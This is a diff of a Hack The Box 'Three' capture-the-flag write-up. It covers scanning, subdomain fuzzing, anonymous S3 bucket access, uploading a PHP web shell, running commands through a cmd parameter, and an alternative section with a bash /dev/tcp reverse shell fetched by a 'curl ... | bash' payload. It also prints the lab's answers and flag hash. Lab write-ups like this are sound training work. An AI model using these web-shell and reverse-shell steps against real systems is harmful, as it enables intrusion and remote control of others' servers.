@@ -12,38 +12,38 @@ layout:
     visible: true
 ---
 
-# Three
+# Three (Tier 1)
 
 ## <mark style="color:blue;">Description</mark>
 
-* **Tier **<mark style="color:green;">**->**</mark>** 1**
+* **Tier&#x20;**<mark style="color:green;">**->**</mark>**&#x20;1**
 * **Difficult** <mark style="color:green;">**->**</mark> Very Easy
 * **OS** <mark style="color:green;">**->**</mark> Linux
-* **Tags **<mark style="color:green;">**->**</mark> Cloud / Custom Applications / AWS / Reconnaissance / Web Site Structure Discovery\
-  &#x20;             Bucket Enumeration / Arbitrary File Upload / Anonymous-Guest Access
+* **Tags&#x20;**<mark style="color:green;">**->**</mark> Cloud / Custom Applications / AWS / Reconnaissance / Web Site Structure Discovery\
+  &#x20;             / Bucket Enumeration / Arbitrary File Upload / Anonymous-Guest Access
 
-<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=1</a></p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (121) (1).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=1</a></p></figcaption></figure>
 
 ## <mark style="color:blue;">Write-up</mark>
 
-* We start doing an initial scan
+* I started doing an initial scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)
 
 <pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap -p- -Pn --min-rate 2000 10.129.246.158
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (216) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* With this, we can answer the first question
+* With this, I answered the first question
 
-<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-> Answer: **2**
+> Answer: _**2**_
 
 ***
 
-* Now we make an exhaustive scan
+* Then I did an exhaustive scan to know more about the services running on the open ports
 
 {% code lineNumbers="true" %}
 ```basic
@@ -51,93 +51,84 @@ nmap -p22,80 -sVC 10.129.246.158
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (217) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* As it has an HTTP service running on port 80, we know it is a web page, and we can go check it on the browser
+* As I found the HTTP protocol running on port 80, I went to the browser to check the deployed content. I found what seemed to be a contact page for a band. Navigating through the site, I didn't find anything relevant apart from an email in the _Contact_ section with a curious domain
 
-<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (218) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (220) (1).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="success" %}
+To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
+{% endhint %}
 
 ***
 
-* As we navigate through the page, in the contact section we find some information, especially an email with a curious domain
+* With this and a little research, I answered the next questions
 
-<figure><img src="../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>
-
-***
-
-* With this and a little research, we can answer some questions
-
-<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (237) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**thetoppers.htb**_
 
 ***
 
-<figure><img src="../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (238) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**/etc/hosts**_
 
 ***
 
-* Now we can add the domain to our known domains by editing the _/etc/hosts_ file. We can do it in a faster way with the help of the `echo` and `tee` commands. Then we check the content has been saved correctly
-
-{% code lineNumbers="true" %}
-```bash
-echo "10.129.246.158 thetoppers.htb" | sudo tee -a /etc/hosts
-```
-{% endcode %}
-
-<figure><img src="../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>
-
-***
-
-* Now we can use the _gobuster_ tool to enumerate the domain with fuzzing, and specifically check if there are any related subdomains. After the operation has finished we find the subdomain _s3.thetoppers.htb_ and with a little research we can know it is a cloud database on Amazon servers.
+* As this domain could be relevant, I added it to the known hosts by editing the _/etc/hosts_ file. Not getting anything relevant from the web page, I tried using the [_Gobuster_](../../web-exploitation/tools-and-utilities.md#gobuster) tool to fuzz the page and find any possible hidden routes. In this case, I enumerated the found domain to check if there were any related subdomains. With that, I found the subdomain _s3.thetoppers.htb_ existed, and with a little research, I learned it was related to a cloud database on the _Amazon_ servers
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
+echo "10.129.246.158 thetoppers.htb" | sudo tee -a /etc/hosts
 gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (222) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (223) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* With this information and some research about the Amazon service we can answer some questions
+* With this information and a little research about _Amazon_ services, I answered the next questions
 
-<figure><img src="../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (239) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**s3.thetoppers.htb**_
 
 ***
 
-<figure><img src="../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (240) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**Amazon S3**_
 
 ***
 
-<figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (241) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**awscli**_
 
 ***
 
-<figure><img src="../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (242) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**aws configure**_
 
 ***
 
-<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (243) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**aws s3 ls**_
 
 ***
 
-* We also add the discovered subdomain to the well-known host list
+* I also added the discovered subdomain to the known hosts to work properly with it
 
 {% code lineNumbers="true" %}
 ```bash
@@ -145,37 +136,41 @@ echo "10.129.246.158 s3.thetoppers.htb" | sudo tee -a /etc/hosts
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (226) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* Now we can try to connect to the S3 service with the _awscli_ utility. First, we configure the tool, in this case, we indicate that it will be a temporary connection with the _temp_ value (These are also the default credentials for AWS connections).
+* So knowing this was an [_AWS_](https://aws.amazon.com/es/) service, I tried to connect to it using the [_awscli_](../../database-attacks/tools-and-utilities.md#awscli) utility. First, I configured the tool, in this case, indicating a temporary connection with the _temp_ value. With this done I tried to list the _S3_ instances and found one named _thetoppers.htb._ Then I listed the elements inside it and found an _index.php_ file, which could be the source code of the web page
 
-<figure><img src="../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+aws configure
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (224) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (229) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (231) (1).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+&#x20;The _temp_ value is the default credentials for AWS connections if everything is scaped
+{% endhint %}
 
 ***
 
-* Now we try to list the S3 bucket elements and we find one named _thetoppers.htbd_
+* With this, I answered the next question
 
-<figure><img src="../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>
-
-***
-
-* We try listing the bucket elements and we find an _index.php_ file, which is the main code file of the web page.
-
-<figure><img src="../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>
-
-***
-
-* With this, we can answer the next question
-
-<figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (244) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**PHP**_
 
 ***
 
-* Then, as we have a connection to the S3 instance we can try to upload a custom file to the bucket with a payload to gain Remote Command Execution. We create a _Shell.php_ file for this purpose.
+* Then as I had a connection to the S3 instance, I tried to upload a custom file to the bucket in an attempt to gain RCE. To do so, I created a _Shell.php_ file with a proper payload to spawn a shell on the machine and read a command. Then I uploaded it and checked if it had worked by listing the contents of the bucket again
 
 {% code lineNumbers="true" %}
 ```bash
@@ -189,67 +184,55 @@ sudo nano Shell.php
 ```
 {% endcode %}
 
-***
-
-* Then we upload the file to the bucket, and check it by listing the contents of the bucket again
-
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
 aws --endpoint=http://s3.thetoppers.htb s3 cp Shell.php s3://thetoppers.htb
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (232) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* If we access the bucket from the browser and try to send _cmd_ as a parameter and a command as a value, we see the server will execute it. With this, we confirm we have gained RCE.
+* After that, I accessed the bucket direction from the browser and tried to send a command using the _cmd_ parameter as set on the payload. I saw the server executed it properly and confirmed I have gained RCE
 
-{% code title="Payload" lineNumbers="true" %}
-```url
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
 http://thetoppers.htb/Shell.php?cmd=id
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (233) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* If we go and check the _/var/www_ folder where normally is saved the information of web sites, we can see there is a _flag.txt_ file.
+* With this, I could explore the filesystem arbitrarily. After some searching, I decided to check the _/var/www_ folder, which usually is the default for the server files, and there I found a _flag.txt_ file. Finally, retrieved the content of the file and got the flag
 
-{% code title="Payload" lineNumbers="true" %}
-```uri
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
 http://thetoppers.htb/Shell.php?cmd=ls /var/www
-```
-{% endcode %}
-
-<figure><img src="../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>
-
-***
-
-* Finally, we check the content of the file.
-
-{% code title="Payload" lineNumbers="true" %}
-```url
 http://thetoppers.htb/Shell.php?cmd=cat /var/www/flag.txt
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (235) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (236) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* With this, we have got the root flag and have pawned the machine
+* With this, I got the root flag and pwned the machine
 
-<figure><img src="../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**a980d99281a28d638ac68b9bf9453c2b**_
 
-***
+## <mark style="color:blue;">Alternative Reverse Shell</mark>
 
-## <mark style="color:blue;">Alternative</mark>
+Instead of abusing the RCE directly on the browser, I tried to get a Reverse Shell on the machine
 
-* Instead of abusing the RCE directly on the browser, we can try to get a Reverse Shell on the machine. First, we create a simple bash script to send the shell connection to our machine.
+* First, I created a simple bash script to send the shell connection to my machine
 
 {% code lineNumbers="true" %}
 ```bash
@@ -261,17 +244,13 @@ sudo nano shell.sh
 ```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.195/1234 0>&1  
-#We use the IP of our machine on the VPN and an arbitrary port
+#I used the my IP on the VPN and an arbitrary port
 ```
 {% endcode %}
 
-{% hint style="info" %}
-We can check our IP with the`ifconfig` command. Normally will be the one on the _tun0_ network interface as this is the interface of the VPN we are connected to.
-{% endhint %}
-
 ***
 
-* Then we establish a Netcat listener on the arbitrary port chosen above
+* Then I established a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener on the arbitrary port chosen above
 
 {% code lineNumbers="true" %}
 ```sh
@@ -279,11 +258,11 @@ nc -nvlp 1234
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (250) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* After this, in another terminal, we establish an HTTP server using Python in the same folder where the _shell.sh_ file is. We choose another arbitrary port for the server.
+* After this, in another terminal, I established an HTTP server using _Python_ in the same folder where the _shell.sh_ file is, and setting another arbitrary port for the server
 
 {% code lineNumbers="true" %}
 ```bash
@@ -291,28 +270,24 @@ python -m http.server 4444
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (251) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* Now we use the RCE to send the shell from the target to our machine using the curl command. We will see the page remain loading.
+* I used the RCE to send the shell from the target to my machine using the `curl` command. I observed the page remained loading and checking the _Python_ server received the petition
 
-{% code title="Payload" overflow="wrap" lineNumbers="true" %}
-```url
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
 http://thetoppers.htb/Shell.php?cmd=curl%2010.10.14.195:4444/shell.sh|bash
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (253) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (255) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
-* If we check the Python server info, we see it has received a petition
+* Finally, I checked the _Netcat_ listener and saw that I had gained a shell from the machine. With that, I could interact with the system more comfortably
 
-<figure><img src="../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>
-
-***
-
-* Finally, we can check our Netcat listener and we will see that we have gained a shell from the machine, with this we can interact with the system more comfortably.
-
-<figure><img src="../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (256) (1).png" alt=""><figcaption></figcaption></figure>
